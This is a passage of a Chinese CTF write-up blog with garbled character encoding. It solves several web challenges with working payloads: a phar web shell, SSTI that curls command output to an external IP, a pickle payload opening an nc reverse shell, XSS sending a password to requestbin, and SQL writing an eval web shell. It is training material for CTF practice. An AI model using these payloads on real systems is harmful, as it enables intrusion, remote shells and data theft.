<p>sessionç”Ÿæˆæ–¹æ³•å¦‚ä»£ç æ‰€ç¤ºï¼Œcookieé€šè¿‡.åˆ†å‰²ä¸ºä¸¤éƒ¨åˆ†ï¼Œå†è¿›è¡Œbase64è§£ç ï¼Œç„¶åå†åˆ¤æ–­ æ˜æ–‡dataå’Œç»è¿‡åŠ å¯†çš„å€¼æ˜¯å¦åŒ¹é…ã€‚</p>
<p>ç¬¬ä¸€æ¬¡æ„é€ å‡ºä¸€ä¸ªè¶…è¿‡72å­—ç¬¦çš„æ˜æ–‡dataï¼Œæ— è®ºåŠ ä»€ä¹ˆå­—ç¬¦å†åé¢æŠŠå®ƒæ‹¼å›å»ï¼Œéƒ½èƒ½å’Œç»è¿‡åŠ å¯†çš„å€¼åŒ¹é…ä¸Š</p>
<img src="/2020/07/04/taoismt/25.png" class="">

<p>å¯ä»¥çœ‹åˆ°index.phpè¿™é‡Œå­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥ç”¨è§¦å‘pharåè®®</p>
<p>åœ¨sessionçš„getæ–¹æ³•ä¸­ä¼ å…¥çš„keyæ˜¯ theme ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´æ§åˆ¶äº† data[â€˜themeâ€™] å°±å¯ä»¥æ§åˆ¶ä»»æ„æ–‡ä»¶åŒ…å«ã€‚å¯ä»¥ä¸Šä¼ ä¸€ä¸ªpharæ–‡ä»¶åŒ…å«ä¸€ä¸ªæ’æœ‰æ¶æ„ä»£ç çš„cssæ–‡ä»¶ã€‚å°±å¯ä»¥å®ç°rce</p>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$png_header = hex2bin(<span class="string">'89504e470d0a1a0a0000000d49484452000000400000004000'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exp.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'exp.css'</span>, <span class="string">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>);</span><br><span class="line">$phar-&gt;setStub($png_header . <span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ ä¹‹åè®°ä¸‹sessionï¼Œè§£å¯†ä¹‹åï¼Œåœ¨æ·»åŠ themeï¼Œvauleä¸ºæ–‡ä»¶çš„è·¯å¾„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$edata = <span class="string">'&#123;"name":"admin","avatar":"dc264ad5.png","flash":&#123;"type":"info","message":"Your avatar has been successfully updated!"&#125;,"theme":"phar://uploads/e703149f.png/exp"&#125;'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">urlsafe_base64_encode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> rtrim(str_replace([<span class="string">'+'</span>,<span class="string">'/'</span>],[<span class="string">'-'</span>,<span class="string">'_'</span>],base64_encode($data)),<span class="string">'='</span>);</span><br><span class="line">&#125;</span><br><span class="line">var_dump(urlsafe_base64_encode($edata));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ›¿æ¢æ‰cookieï¼Œå°±èƒ½rceäº†</p>
<img src="/2020/07/04/taoismt/26.png" class="">

<h3 id="GWCTF-2019-ä½ çš„åå­—"><a href="#GWCTF-2019-ä½ çš„åå­—" class="headerlink" title="[GWCTF 2019]ä½ çš„åå­—"></a>[GWCTF 2019]ä½ çš„åå­—</h3><p>ç•Œé¢å°±ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œä»¥ä¸ºä¼šæ˜¯SQLæ³¨å…¥ï¼Œifæ²¡æœ‰è¢«æ‰“å°å‡ºæ¥ï¼Œä½†æ˜¯å…¶ä»–æ€ä¹ˆæµ‹è¯•éƒ½åªä¼šæ‰“å°å‡ºè¾“å…¥çš„å†…å®¹</p>
<p>æ‰«æï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆå‘ç°</p>
<p>åˆ°è¿™é‡Œï¼Œæƒ³åˆ°å°è¯•ä¸€ä¸‹SSTIæ¨¡æ¿æ³¨å…¥è¯´ä¸å®šä¼šæœ‰æ‰€å‘ç°ï¼Œå‰é¢çš„ifè¢«è¿‡æ»¤äº†ï¼ŒåŠ ä¸Šæ—©ä¸Šåˆšåšäº†python çš„flaskçš„sstiï¼Œå°±å…ˆè¯•è¯•ï¼Œå‘ç°osï¼Œifï¼Œclassç­‰éƒ½è¢«è¿‡æ»¤äº†ï¼Œåé¢çš„æµ‹è¯•å°±è¦ç”¨å­—å…¸fuzzäº†</p>
<p>å‚è€ƒäº†å¸ˆå‚…çš„wp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">blacklist = [<span class="string">'import'</span>, <span class="string">'getattr'</span>, <span class="string">'os'</span>, <span class="string">'class'</span>, <span class="string">'subclasses'</span>, <span class="string">'mro'</span>, <span class="string">'request'</span>, <span class="string">'args'</span>, <span class="string">'eval'</span>, <span class="string">'if'</span>, <span class="string">'for'</span>,</span><br><span class="line">                 <span class="string">' subprocess'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>, <span class="string">'popen'</span>, <span class="string">'builtins'</span>, <span class="string">'compile'</span>, <span class="string">'execfile'</span>, <span class="string">'from_pyfile'</span>, <span class="string">'local'</span>,</span><br><span class="line">                 <span class="string">'self'</span>, <span class="string">'item'</span>, <span class="string">'getitem'</span>, <span class="string">'getattribute'</span>, <span class="string">'func_globals'</span>, <span class="string">'config'</span>]</span><br><span class="line"><span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> no <span class="keyword">in</span> s:</span><br><span class="line">            s = s.replace(no, <span class="string">''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨æœ€åçš„configæ¥è¿›è¡Œç»•è¿‡è¿‡æ»¤ï¼Œå› ä¸ºåœ¨è¿‡æ»¤çš„é»‘ç›’ä¸­å®ƒæ˜¯æœ€åä¸€ä¸ªï¼Œæ£€æµ‹äº†configä¹‹åä¹Ÿå°±ç»“æŸè¿‡æ»¤äº†</p>
<p>è¿™é‡Œç”±äºè¿˜è¿‡æ»¤äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰ç¢°åˆ°è¿‡è¿™ç§æƒ…å†µï¼Œåœ¨å…ˆçŸ¥ç¤¾åŒºæ‰¾åˆ°äº†ä¸€ç¯‡æ·±å…¥å­¦ä¹ SSTIæ³¨å…¥çš„æ–‡ç« ï¼Œè¿™é‡Œç»™äº†payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">'curl http://xx.xxx.xx.xx:8080/?i=`whoami`'</span>).read()==<span class="string">'p'</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br><span class="line"><span class="comment">#ç›¸å½“äºæŠŠå‘½ä»¤æ‰§è¡Œçš„ç»“æœå¤–å¸¦ï¼Œè¿™å°±è¦åå¼¹shelläº†</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡ŒæŠŠpayloadæ”¹æ”¹å°±èƒ½ç”¨äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% iconfigf <span class="string">''</span>.__claconfigss__.__mconfigro__[<span class="number">2</span>].__subclaconfigsses__()[<span class="number">59</span>].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen(<span class="string">'curl http://174.2.11.217:8888/ -d `ls/|base64`;'</span>) %&#125;<span class="number">1</span>&#123;% endiconfigf %&#125;</span><br><span class="line"><span class="comment">#buuå¼€ä¸€å°å†…ç½‘æœºå­ç›‘å¬ç«¯å£å°±èƒ½å¾—åˆ°è¿”å›çš„å†…å®¹ï¼Œè¿™é‡Œä¸ç”¨base64åªèƒ½å›æ˜¾ä¸€ä¸ªappä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› </span></span><br><span class="line">app</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag_1s_Hera</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mn</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢ç›´æ¥è¯»å–flagæ–‡ä»¶å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% iconfigf <span class="string">''</span>.__claconfigss__.__mconfigro__[<span class="number">2</span>].__subclaconfigsses__()[<span class="number">59</span>].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen(<span class="string">'curl http://174.2.11.217:8888/ -d `cat /flag_1s_Hera`;'</span>) %&#125;<span class="number">1</span>&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure>

<img src="/2020/07/04/taoismt/7.png" class="">

<h3 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h3><p>çœ‹åˆ°é¢˜ç›®ï¼Œpickleï¼Œæœ‰ç‚¹çœ¼ç†Ÿï¼Œæœä¸€ä¸‹ï¼Œæ˜¯pythonçš„pickleåºåˆ—åŒ–æ¼æ´æ²¡è·‘äº†</p>
<p>ç›´æ¥æ‰¾ä¸ªpayloadæ”¹æ”¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (eval, (<span class="string">"__import__('os').system('nc 174.2.12.2 9999 -e/bin/sh')"</span>,))</span><br><span class="line">a = A()</span><br><span class="line">print( base64.b64encode( pickle.dumps(a) ) )</span><br><span class="line"><span class="comment">#gANjYnVpbHRpbnMKZXZhbApxAFg3AAAAX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDE3NC4yLjEyLjIgOTk5OSAtZS9iaW4vc2gnKXEBhXECUnEDLg==</span></span><br></pre></td></tr></table></figure>

<p>ç½‘é¡µæ›¿æ¢æ‰cookieçš„å€¼ï¼Œå¼€ä¸€å°å†…ç½‘æœºç›‘å¬ç«¯å£ï¼Œå†ç‚¹å‡»bug flag</p>
<img src="/2020/07/04/taoismt/8.png" class="">

<h3 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h3><p>åœ¨æ§åˆ¶å°é‡Œå‘ç°login.jsæ–‡ä»¶</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.cookie &amp;&amp; <span class="built_in">document</span>.cookie != <span class="string">''</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">'; '</span>);</span><br><span class="line">	<span class="keyword">var</span> cookie = &#123;&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> arr = cookies[i].split(<span class="string">'='</span>);</span><br><span class="line">		<span class="keyword">var</span> key = arr[<span class="number">0</span>];</span><br><span class="line">		cookie[key] = arr[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">typeof</span>(cookie[<span class="string">'user'</span>]) != <span class="string">"undefined"</span> &amp;&amp; <span class="keyword">typeof</span>(cookie[<span class="string">'psw'</span>]) != <span class="string">"undefined"</span>)&#123;</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">"username"</span>)[<span class="number">0</span>].value = cookie[<span class="string">'user'</span>];</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">"password"</span>)[<span class="number">0</span>].value = cookie[<span class="string">'psw'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¼šè®°å½•passwordçš„cookieå€¼,ç™»å½•ä¹‹åï¼Œåœ¨Feedbacké¡µé¢æœ‰è¿‡æ»¤çš„å†…å®¹</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line">			<span class="keyword">if</span>(is_array($feedback))&#123;</span><br><span class="line">				echo <span class="string">"&lt;script&gt;alert('åé¦ˆä¸åˆæ³•');&lt;/script&gt;"</span>;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$blacklist = [<span class="string">'_'</span>,<span class="string">'\''</span>,<span class="string">'&amp;'</span>,<span class="string">'\\'</span>,<span class="string">'#'</span>,<span class="string">'%'</span>,<span class="string">'input'</span>,<span class="string">'script'</span>,<span class="string">'iframe'</span>,<span class="string">'host'</span>,<span class="string">'onload'</span>,<span class="string">'onerror'</span>,<span class="string">'srcdoc'</span>,<span class="string">'location'</span>,<span class="string">'svg'</span>,<span class="string">'form'</span>,<span class="string">'img'</span>,<span class="string">'src'</span>,<span class="string">'getElement'</span>,<span class="string">'document'</span>,<span class="string">'cookie'</span>];</span><br><span class="line">			foreach ($blacklist <span class="keyword">as</span> $val) &#123;</span><br><span class="line">		        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">		            <span class="keyword">if</span>(stripos($feedback,$val) !== <span class="literal">false</span>)&#123;</span><br><span class="line">		                $feedback = str_ireplace($val,<span class="string">""</span>,$feedback);</span><br><span class="line">		            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		                <span class="keyword">break</span>;</span><br><span class="line">		            &#125;</span><br><span class="line">		        &#125;</span><br><span class="line">		    &#125;</span><br><span class="line">		    --&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜å’Œä¹‹å‰çš„ä¸€é“é¢˜ç›¸ä¼¼ï¼Œç”¨cookieæ¥ç»•è¿‡å¯¹å…¶ä»–å…³é”®è¯çš„æ£€æµ‹</p>
<p>expï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;incookieput type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">&lt;incookieput type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">&lt;scrcookieipt scookierc=<span class="string">"./js/login.js"</span>&gt;&lt;<span class="regexp">/scrcookieipt&gt;</span></span><br><span class="line"><span class="regexp">&lt;scrcookieipt&gt;</span></span><br><span class="line"><span class="regexp">    var psw = docucookiement.getcookieElementsByName("password")[0].value;</span></span><br><span class="line"><span class="regexp">    docucookiement.locacookietion="http:/</span><span class="regexp">/http.requestbin.buuoj.cn/</span><span class="number">11</span>uk8c71/?a=<span class="string">"+psw;</span></span><br><span class="line"><span class="string">&lt;/scrcookieipt&gt;</span></span><br></pre></td></tr></table></figure>

<p>RequestBinæä¾›äº†ä¸€ä¸ªURLï¼Œè¯¥URLå°†æ”¶é›†å¯¹å…¶å‘å‡ºçš„è¯·æ±‚ï¼Œé¦–é¡µç‚¹å‡»create a requestbinå¯ä»¥æ¥æ”¶åˆ°flag</p>
<img src="/2020/07/04/taoismt/9.png" class="">

<h3 id="XDCTF-2015-filemanager"><a href="#XDCTF-2015-filemanager" class="headerlink" title="[XDCTF 2015]filemanager"></a>[XDCTF 2015]filemanager</h3><p>ä¸Šä¼ ï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªï¼Œç»™äº†è·¯å¾„ï¼Œèšå‰‘è¿ä¸ä¸Š</p>
<p>æœ‰ä¸€ä¸ªæ–‡ä»¶é‡å‘½åï¼Œçœ‹åˆ°è¿™å°±æƒ³åˆ°äº†äºŒæ¬¡æ³¨å…¥ï¼Œä½†æ˜¯æ²¡æœ‰æºç ï¼Œæ‰€ä»¥ï¼Œå˜¿å˜¿ï¼ŒGitHubå«–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#upload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_FILES) &#123;</span><br><span class="line">	$file = $_FILES[<span class="string">"upfile"</span>];</span><br><span class="line">	<span class="keyword">if</span> ($file[<span class="string">"error"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">		$name = basename($file[<span class="string">"name"</span>]);</span><br><span class="line">		$path_parts = pathinfo($name);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!in_array($path_parts[<span class="string">"extension"</span>], <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"zip"</span>, <span class="string">"txt"</span>))) &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">"error extension"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		$path_parts[<span class="string">"extension"</span>] = <span class="string">"."</span> . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line"></span><br><span class="line">		$name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// $path_parts["filename"] = $db-&gt;quote($path_parts["filename"]);</span></span><br><span class="line">		<span class="comment">// Fix</span></span><br><span class="line">		$path_parts[<span class="string">'filename'</span>] = addslashes($path_parts[<span class="string">'filename'</span>]);</span><br><span class="line"></span><br><span class="line">		$sql = <span class="string">"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"</span>;</span><br><span class="line"></span><br><span class="line">		$fetch = $db-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ($fetch-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">"file is exists"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (move_uploaded_file($file[<span class="string">"tmp_name"</span>], UPLOAD_DIR . $name)) &#123;</span><br><span class="line"></span><br><span class="line">			$sql = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"</span>;</span><br><span class="line">			$re = $db-&gt;query($sql);</span><br><span class="line">			<span class="keyword">if</span> (!$re) &#123;</span><br><span class="line">				print_r($db-&gt;error);</span><br><span class="line">				<span class="keyword">exit</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$url = <span class="string">"/"</span> . UPLOAD_DIR . $name;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">"upload error"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		print_r(error_get_last());</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#rename.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">	$result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">	<span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		$result = $result-&gt;fetch_assoc();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($result) &#123;</span><br><span class="line">		$req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">		$re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">		<span class="keyword">if</span> (!$re) &#123;</span><br><span class="line">			print_r($db-&gt;error);</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$oldname = UPLOAD_DIR . $result[<span class="string">"filename"</span>] . $result[<span class="string">"extension"</span>];</span><br><span class="line">		$newname = UPLOAD_DIR . $req[<span class="string">"newname"</span>] . $result[<span class="string">"extension"</span>];</span><br><span class="line">		<span class="keyword">if</span> (file_exists($oldname)) &#123;</span><br><span class="line">			rename($oldname, $newname);</span><br><span class="line">		&#125;</span><br><span class="line">		$url = <span class="string">"/"</span> . $newname;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ³¨æ„åˆ°<code>$re = $db-&gt;query(&quot;update file set filename=&#39;{$req[&#39;newname&#39;]}&#39;, oldname=&#39;{$result[&#39;filename&#39;]}&#39; where fid={$result[&#39;fid&#39;]}&quot;);</code></p>
<p>è¿™é‡ŒæŠŠæ•°æ®åº“é‡Œå–å‡ºçš„æ–‡ä»¶ååˆå†ä¸€æ¬¡å…¥åº“äº†ï¼Œé€ æˆäºŒæ¬¡æ³¨å…¥</p>
<p>å°†æ•°æ®åº“ä¸­extensionå­—æ®µçš„å€¼æ”¹ä¸ºç©ºï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥æ§åˆ¶filenameçš„å€¼ï¼Œé‚£ä¹ˆç­‰äºèƒ½æ§åˆ¶renameå‡½æ•°çš„ä¸¤ä¸ªå‚æ•°çš„å€¼ï¼Œå°†extensionæ”¹ä¸ºç©ºäº†ï¼Œé‚£ä¹ˆå®é™…ä¸Šæ•°æ®åº“ä¸­çš„filenameæ€»æ¯”æ–‡ä»¶ç³»ç»Ÿä¸­çœŸæ˜¯çš„æ–‡ä»¶åå°‘ä¸€ä¸ªåç¼€ã€‚é‡æ–°ä¸Šä¼ ä¸€ä¸ªåŒåçš„æ–‡ä»¶ï¼Œå†é‡å‘½åå³å¯</p>
<img src="/2020/07/04/taoismt/10.png" class="">

<p>ä¸Šä¼ ç¬¬ä¸€ä¸ªå›¾ç‰‡ï¼Œé‡å‘½åä¸ºx.jpg</p>
<p>å†ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œé‡å‘½åä¸ºx.phpå³å¯getshell</p>
<img src="/2020/07/04/taoismt/11.png" class="">

<h3 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h3><p>æ³¨å†Œç™»å½•ï¼Œå¼€å§‹ä»¥ä¸ºä¼šæœ‰äºŒæ¬¡æ³¨å…¥ï¼Œä½†æ˜¯åœ¨æ³¨å†Œç•Œé¢æ²¡æœ‰æ‰¾åˆ°ä¿®æ”¹å¯†ç ï¼Œç™»å½•ä¹‹ååœ¨ä¸ªäººä¿¡æ¯é¡µé¢æœ‰ä¸ªuser_idï¼Œæ„Ÿè§‰åº”è¯¥æ˜¯ä¸ªç‚¹ï¼Œå¼‚æˆ–ä¸€ä¸‹ï¼Œæ‰¾å¯¹äº†</p>
<p>ç»è¿‡æµ‹è¯•è¿‡æ»¤äº†selectï¼Œunionï¼Œå•å¼•å·ï¼Œæ‰¾æ‰¾èµ„æ–™ï¼Œå¥½åƒå¯ä»¥load_fileæ¥ç›²æ³¨ï¼Œè¿™é‡Œç›´æ¥å€Ÿç”¨å¸ˆå‚…è·‘å‡ºçš„æ–‡ä»¶çš„æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#waf.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">		$black_str = <span class="string">"/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i"</span>;</span><br><span class="line">		$str = preg_replace($black_str, <span class="string">"@@"</span>,$str);</span><br><span class="line">		<span class="keyword">return</span> addslashes($str);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>â€‹    wafä¸­åˆ—å‡ºäº†è¿‡æ»¤çš„å‡½æ•°ï¼Œä¸è¿‡è¿˜æœ‰asciiã€midã€ifèƒ½ç”¨ï¼Œå’Œå‰é¢æµ‹è¯•çš„å·®ä¸å¤š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#user.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">		$id=waf($_GET[<span class="string">'id'</span>]);</span><br><span class="line">		$sql = <span class="string">"SELECT * FROM dwvs_user_message WHERE DWVS_user_id ="</span>.$id;</span><br><span class="line">		$data = mysqli_multi_query($connect,$sql) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">		</span><br><span class="line">		$result = mysqli_store_result($connect);</span><br><span class="line">		$row = mysqli_fetch_row($result);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;h1&gt;user_id:'</span>.$row[<span class="number">0</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:"</span>.$row[<span class="number">1</span>].<span class="string">"&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;æ³¨å†Œæ—¶é—´ï¼š"</span>.$row[<span class="number">4</span>].<span class="string">"&lt;/h3&gt;"</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨çš„æ˜¯mysqli_multi_queryæŸ¥è¯¢ï¼Œèƒ½å¤Ÿæ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ï¼Œè¿™å°±æƒ³åˆ°ç”¨å †å æŸ¥è¯¢äº†ï¼Œä¸è¿‡selecté‚£äº›å¸¸ç”¨çš„å…³é”®è¯banæ‰äº†ï¼Œè¿™é‡Œå°±è¦ç”¨åˆ°ä¹‹å‰åˆšé¢„ä¹ çš„sqlé¢„å¤„ç†è¯­å¥</p>
<p>expï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> @b=<span class="number">0x53454c45435420273c3f70687020406576616c28245f504f53545b615d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f7368656c6c2e70687027</span>;<span class="keyword">prepare</span> a <span class="keyword">from</span> @b;<span class="keyword">execute</span> a;</span><br><span class="line"><span class="comment">#set @b=SELECT '&lt;?php @eval($_POST[a]);?&gt;' into outfile '/var/www/html/favicon/shell.php';prepare a from @b;execute a;</span></span><br></pre></td></tr></table></figure>

<p>å°†shellå†™å…¥åˆ°è¯¥è·¯å¾„ä¸‹çš„shell.phpæ–‡ä»¶ä¸­ï¼Œå†å»è®¿é—®/favcion/shell.phpï¼Œç”¨èšå‰‘è¿æ¥æˆ–è€…ç›´æ¥å‘½ä»¤æ‰§è¡Œ</p>
<img src="/2020/07/04/taoismt/12.png" class="">

<h3 id="BSidesCF-2019-Mixer"><a href="#BSidesCF-2019-Mixer" class="headerlink" title="[BSidesCF 2019]Mixer"></a>[BSidesCF 2019]Mixer</h3><p>ç›´æ¥ç™»å½•ï¼Œé¢˜ç›®è¦æ±‚è¦ç”¨adminç™»å½•ï¼Œis_adminçš„å€¼åœ¨å‰ç«¯æ›´æ”¹æ²¡æœ‰ç”¨ï¼ŒæŠ“ä¸ªåŒ…çœ‹çœ‹</p>
